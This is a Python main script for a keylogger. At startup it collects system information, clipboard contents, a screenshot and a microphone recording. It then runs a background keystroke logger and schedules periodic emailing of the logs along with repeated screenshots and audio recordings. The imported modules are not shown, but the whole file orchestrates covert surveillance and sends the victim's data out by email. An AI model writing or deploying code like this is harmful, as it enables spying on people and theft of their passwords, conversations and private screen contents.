import threading
import time
import config
from modules import logger, system_info, clipboard, microphone, screenshot, emailer, timer


# === Run intial collection immediatley upon start up ===
def intial_collection():
    try:
        system_info.collect()
        clipboard.capture()
        screenshot.capture()
        microphone.record()
    except Exception as e:
        print( f" [ERROR] During intital collection: {e} ")

# === Start Keystroke logger in background ===
def start_logging():
    log_thread = threading.Thread(target=logger.start, daemon=True)
    log_thread.start()
    print(" [INFO] Keystroke logging started.")

# === Schedule repeating task ===
def schedule_task():
    if config.ENABLE_PERIODIC_TASK:
        timer.schedule_every(config.EMAIL_INTERVAL, emailer.send_logs)
        timer.schedule_every(config.SCREENSHOT_INTERVAL, screenshot.capture)
        timer.schedule_every(config.MIC_INTERVAL, lambda: microphone.record(duration=config.MIC_DURATION))
        print("[INFO] Periodic task scheduled.")

# === Main Function ===
def main():
    print("[INFO] Keylogger starting up...")
    intial_collection()
    start_logging()
    schedule_task()

    try:
        while True:
            time.sleep(10) #Keep the main thread alive
    except KeyboardInterrupt:
        print(" [INFO] Keylogger terminated by user.")

if __name__ == "__main__":
    main()
